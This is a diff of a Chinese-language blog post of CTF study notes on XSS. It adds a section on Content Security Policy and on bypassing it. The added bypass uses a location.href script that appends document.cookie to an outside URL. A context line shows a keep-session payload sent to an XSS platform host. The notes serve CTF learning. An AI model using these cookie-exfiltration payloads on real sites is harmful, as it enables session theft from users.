@@ -1,7 +1,7 @@
 ---
 author: "Yiming Shen"
 date: 2022-02-26
-lastmod: 2022-02-26
+lastmod: 2022-03-05
 title: "XSS类型题目积累及资料"
 tags: [
     "CTF",
@@ -101,10 +101,44 @@ if(''==1){keep=new Image();keep.src='https://xss.pt/xss.php?do=keepsession&id=Sh
 
    可转义第一个引号使其和第二个参数的引号闭合 在第二个参数内插入payload
 
-3. 
+### CSP过滤
+
+> **C**ontent **S**ecurity **P**olicy，内容安全策略。是一个额外的安全层，用于检测并削弱特定类型的攻击。
+
+设置CSP策略后，将通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除XSS攻击所依赖的载体。
+
+#### CSP如何工作
+
+1. 通过响应包头实现
+
+   ```htaccess
+   Content-Security-policy: default-src 'self'; script-src 'self' allowed.com; img-src 'self' allowed.com; style-src 'self';
+   ```
+
+2. 通过HTML元标签实现
+
+   ```html
+   <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
+   ```
+
+ [CSP Evaluator](https://link.segmentfault.com/?enc=S%2FuAV9xAPsV9LSRQyBP9WA%3D%3D.z2rAfMwDRlsYWhHjRMfZa%2F6a9gM73YZ4DQ0TstGCamu2MU5csmlZ9ECOzmNxSYHN)
+
+#### 绕过方法
+
+> `location.href`绕过
+
+CSP不影响location.href跳转，因为在大多数网站中的跳转功能都是靠前端实现的，如果限制跳转将会使网站很大一部分功能受到影响，所以利用跳转来绕过CSP是一个万能的方法:
+
+```html
+<script>location.href="http://127.0.0.1"+document.cookie;</script>
+```
+
+
 
 ## 参考
 
 [1] [XSS平台的使用](http://zhuabapa.top/2019/12/25/XSS%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/)
 
-[2] [从0到1:CTFer](#xss)
+[2] [从0到1:CTFer成长之路](#xss)
+
+[3] [合天网安实验室-CSP浅析与绕过](https://segmentfault.com/a/1190000039996161)
